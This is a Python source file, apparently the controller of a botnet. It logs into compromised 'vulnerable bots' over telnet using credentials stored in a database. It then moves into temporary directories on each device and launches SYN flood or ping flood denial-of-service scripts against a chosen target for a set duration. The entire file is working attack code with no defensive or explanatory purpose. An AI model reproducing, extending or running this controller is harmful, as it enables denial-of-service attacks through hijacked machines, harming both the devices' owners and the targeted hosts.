# Logs into each bot in the database and remotely launches attacks

import sys
import telnetlib

from defs import ATTACK_TYPES, PROMPT, PYTHON_WORKING_VERSIONS

def attempt_login(bot):
    '''
        Attempts to log into a vulnerable bot

        * bot - bot credentials from database

        Returns a handle to the current telnet session. On error,
        returns None.
    '''

    bot_ip = bot[0].encode('ascii')
    bot_port = bot[1]
    bot_username = bot[2].encode('ascii')
    bot_password = bot[3].encode('ascii')

    conn = telnetlib.Telnet(bot_ip, bot_port)
    status = conn.expect(
        ['login: ', 'Login: ', 'incorrect', 'Incorrect']
    )
    if status[0] > 1:
        conn.close()
        return None

    conn.write(bot_username + '\n')
    status = conn.expect(
        ['password: ', 'Password: ', 'incorrect', 'Incorrect']
    )
    if status[0] > 1:
        conn.close()
        return None

    conn.write(bot_password + '\n')
    status = conn.expect(PROMPT)
    if status[0] == -1:
        conn.close()
        return None

    return conn

def launch_attack(bot, attack_type, duration, target):
    '''
        Launches an attack on a target host using a particular bot

        * bot - bot credentials retrieved from database
        * attack_type - type of attack to execute
        * duration - duration of attack
        * target - target on which to launch attack

        Note: You need to have root access to launch some of these
        attacks, such as syn flood, since they involve creating raw
        sockets.
    '''

    conn = attempt_login(bot)
    if conn:
        # If python is not installed or we have incorrect version
        # we cannot attack
        # Abort!
        conn.write('python --version\n')
        status = conn.expect(PYTHON_WORKING_VERSIONS)
        if status[0] == -1:
            print(
                '[-] No working version of python is installed on %s'
                % target
            )
            print('    Unable to launch attack')
            return

        # find location of attack vectors
        conn.write(
            '''
                cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;
                cd bot;
                cd attacks;
            '''
        )

        if attack_type == ATTACK_TYPES['syn_flood']:
            conn.write(
                'python tcp_syn_flood.py -d %d -t %s\n'
                % (duration, target)
            )
        elif attack_type == ATTACK_TYPES['ping_flood']:
            conn.write(
                'python ping_flood.py -d %d -t %s\n'
                % (duration, target)
            )
        status = conn.expect(['permitted', 'Permitted'])
        if status != -1:
            print('[-] Unable to execute attack')
            print('    Operation not permitted/no root access')
        conn.write('exit\n')
        conn.close()
    else:
        print('[!] Unable to log into bot from database')
        print('    Attack aborted!')
